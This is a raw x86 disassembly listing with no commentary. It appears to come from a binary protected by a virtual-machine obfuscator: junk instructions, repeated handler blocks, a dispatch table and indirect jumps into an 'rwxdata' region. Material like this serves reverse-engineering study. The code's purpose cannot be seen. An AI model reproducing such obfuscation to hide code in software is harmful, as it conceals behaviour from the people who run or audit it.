pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512ad4
mov [ ebp ] ax
mov [ esp ] 0xac1d1126
mov [ esp ] 0xbe
mov [ esp ] 0xf8
mov [ esp ] 0xee
lea esp [ esp + 0x54 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512bc2
mov [ esp + 0x44 ] ecx
mov [ esp + 0x4 ] al
mov [ esp + 0x8 ] bh
mov [ esp + 0x40 ] edx
mov [ esp + 0xc ] eax
mov [ esp ] 0x2c
call sub_5130f4
shl al cl
mov al [ esi - 0x1 ]
cmc
cmp di 0x23c6
lea ecx [ edx + 0x4482b25e ]
add al bl
jmp sub_5137b9
sub_512c1f
push 0xe5ff6cdb
mov [ ebp ] edx
pushad
push 0x2e9b6eb9
lea esp [ esp + 0x34 ]
jne rwxdata
pushad
lea ebx [ eax + 0x6a190e72 ]
mov ebx [ esp + 0x20 ]
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
test dl dh
push edi
btc bx 0x7
mov ebx eax
cmp sp bp
bt edi 0xb
clc
pushfd
and ebx 0xff0
cmc
pushfd
cmc
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
cmp ebx 0xfe0
pushad
push 0x408d4e44
mov [ esp + 0x4 ] 0x1c
lea esp [ esp + 0x30 ]
jne rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
bts bx 0xf
shl bl 0x3
neg bx
xor [ ebp + 0xc ] 0x20
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
setge bh
pop ebx
pushfd
mov [ esp ] esi
lea esp [ esp + 0x4 ]
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512cbc
mov [ esp + 0x38 ] ebx
push 0x48eb6052
push 0xd1cc5e1
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x3c ]
jmp rwxdata
pushfd
pushfd
mov [ esp + 0x40 ] 0x0
mov [ esp ] 0x36
mov [ esp ] 0xf5
lea esp [ esp + 0x40 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512cef
pushfd
mov [ esp + 0x34 ] ebx
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x30 ]
push [ esp ]
call sub_512d50
mov [ esp + 0x3c ] edi
pushfd
jmp rwxdata
call sub_5139c0
dec al
mov edx [ ebp ]
xor al 0xe0
ror al 0x3
sar al cl
add ebp 0x2
mov al ah
mov al [ edx ]
jmp rwxdata
call sub_511d17
sub_512d50
pushfd
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x4 ] 0x22
lea esp [ esp + 0x38 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512db1
lea esp [ esp + 0x2c ]
jl rwxdata
pushad
pushfd
mov [ esp ] 0x23
clc
lea esi [ esi - 0x1 ]
jmp rwxdata
bt di 0x1
push ebp
lea esi [ esi - 0x1 ]
mov [ esp ] cl
ror al 0x1
pushad
clc
cmp si bx
sub bl al
cmp dl dh
test dh ch
cmc
mov ax [ eax + edi ]
bt bp bx
sub ebp 0x2
jmp rwxdata
ror al 0x1
call sub_511b76
clc
sub ebp 0x2
cmp esi eax
jmp rwxdata
mov [ ebp ] ax
pushfd
push [ esp + 0x8 ]
pushfd
push eax
lea esp [ esp + 0x34 ]
jmp rwxdata
clc
pushfd
add [ ebp + 0x4 ] al
pushad
mov [ esp ] 0x361b
mov [ esp + 0x8 ] cx
pushfd
pop [ esp + 0x24 ]
lea esp [ esp + 0x24 ]
je rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
pushad
mov [ esp + 0x8 ] al
push [ esp + 0x20 ]
pop [ ebp ]
push 0x2c34ceae
lea esp [ esp + 0x28 ]
jmp rwxdata
pop [ ebp ]
pushad
push ebp
push ebp
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512e56
mov [ ebp + 0x8 ] ebx
lea esp [ esp + 0x14 ]
jns rwxdata
jmp rwxdata
pushfd
pushfd
mov [ ebp + 0x4 ] ecx
mov [ esp ] bp
call sub_512c1f
mov [ esp ] ch
mov [ esp + 0x8 ] esi
mov [ esp + 0x8 ] eax
push 0x73d4b8c
mov [ esp + 0x8 ] esi
pushfd
push edi
push edx
push [ esp + 0x4 ]
mov [ esp + 0x14 ] edi
call sub_513798
push 0xd40b5a83
pushad
push [ esp ]
mov [ ebp + 0x4 ] ecx
pushfd
pushfd
push esi
pushfd
mov [ ebp ] edx
mov [ esp + 0x4 ] edi
mov [ esp + 0x10 ] 0x2f20
lea esp [ esp + 0x38 ]
jne rwxdata
pushad
lea ebx [ eax + 0x6a190e72 ]
mov ebx [ esp + 0x20 ]
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
movzx bx bl
bswap bx
neg bl
mov ebx eax
pushfd
pushfd
clc
cmp bl 0x6f
and ebx 0xff0
pushfd
bt di 0xb
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
stc
cmp ebx 0xfe0
pushad
push [ esp ]
lea esp [ esp + 0x30 ]
jne rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
test bl dh
shr bx 0xa
mov bl cl
bt dx 0x9
xor [ ebp + 0xc ] 0x20
lea ebx [ esp + 0x41db6dac ]
pushfd
mov ebx [ esp + 0x4 ]
pushfd
pushfd
push [ esp + 0x4 ]
mov [ esp ] dh
lea esp [ esp + 0x14 ]
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512e95
mov [ esp ] dh
push [ esp + 0x4 ]
pop [ ebp ]
pushfd
push [ esp ]
pushad
mov [ esp + 0x4 ] bl
lea esp [ esp + 0x30 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512f6f
jmp rwxdata
jmp rwxdata
mov [ esp + 0x2c ] edi
pushfd
pushfd
mov [ esp + 0x30 ] ecx
jmp rwxdata
mov [ esp + 0x2c ] edx
push esp
jmp rwxdata
push 0xb196af6
pushfd
pushfd
pop [ esp + 0x34 ]
jmp sub_513c1c
sub_51300d
call $+5
lea esp [ esp + 0x34 ]
jbe rwxdata
call sub_511f5b
mov [ esp + 0x24 ] ebx
call sub_512220
mov [ ebp ] eax
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_51306d
call sub_5123f5
call j_sub_5132fa
mov [ esp ] 0x36
test bl 0x88
sub ebp 0x2
pushfd
shr ax cl
pushfd
jmp rwxdata
pushfd
pushfd
mov [ ebp + 0x4 ] ax
jmp rwxdata
call j_sub_5140cb
mov [ esp + 0x28 ] ecx
jmp rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x28 ] edx
mov [ esp + 0x8 ] cx
pushfd
pushfd
pop [ esp + 0x28 ]
pushfd
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
pushad
call sub_511276
xchg bp ax
pop eax
jmp rwxdata
push edi
pushfd
mov [ esp + 0x4 ] ebx
pushad
mov [ esp + 0x8 ] ax
mov [ esp ] bx
push [ rwxdata ]
pop [ esp + 0x20 ]
pushad
jmp rwxdata
pop ebp
not ch
pop ecx
pushfd
pushfd
pushad
push [ esp + 0x28 ]
retn 0x2c
push [ esp ]
mov [ esp + 0x40 ] 0x0
push [ esp ]
push 0xad29083b
push [ esp + 0x4 ]
lea esp [ esp + 0x4c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513102
lea esp [ esp + 0x44 ]
jne rwxdata
pushad
lea ebx [ eax + 0x6a190e72 ]
mov ebx [ esp + 0x20 ]
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
adc bx sp
shld bx dx cl
or bh cl
ror bx 0xe
mov ebx eax
bt sp 0x3
pushfd
pushfd
and ebx 0xff0
bt dx ax
call sub_51150a
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513131
call sub_511f17
inc al
pushfd
clc
bt esp ebx
neg al
jmp rwxdata
stc
clc
ror al 0x2
stc
sub esp 0xfffffff8
jae rwxdata
push 0xbcc96712
pushad
call sub_513f54
test al 0x80
mov al [ esi - 0x1 ]
call sub_5139d2
add esi 0xffffffff
test ch 0xd
pushad
stc
add bl al
mov [ esp + 0x8 ] bh
sub ebp 0x2
jmp rwxdata
mov [ esp + 0x4 ] edi
push [ esp ]
mov [ ebp ] ax
mov [ esp + 0x4 ] ah
pushfd
mov [ esp ] bp
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513144
push [ esp ]
pushfd
push [ rwxdata ]
pop [ esp + 0x30 ]
mov [ esp + 0x4 ] dh
mov [ esp + 0x2c ] 0x0
pushfd
pushfd
push 0x75c38c2c
lea esp [ esp + 0x38 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513189
pushad
pushfd
pushfd
mov [ esp + 0x28 ] ecx
push [ esp ]
pushfd
mov [ esp ] 0x6f
mov [ esp + 0x2c ] ebp
jmp rwxdata
jmp rwxdata
mov [ esp + 0x28 ] eax
mov [ esp ] al
mov [ esp + 0x4 ] 0xf770b11
mov [ esp + 0x4 ] 0x5372
mov [ esp + 0x4 ] esp
mov [ esp + 0x24 ] esi
push 0x845fd6cb
mov [ esp + 0x4 ] eax
jmp rwxdata
mov [ esp ] 0xb3
mov [ esp + 0x24 ] edi
call sub_51219e
sub_51326a
fild [ ebp ]
mov [ esp + 0x4 ] 0x74
pushad
mov [ esp + 0xc ] 0xf6
mov [ esp ] esi
lea esp [ esp + 0x30 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_513304
pushfd
call sub_513df1
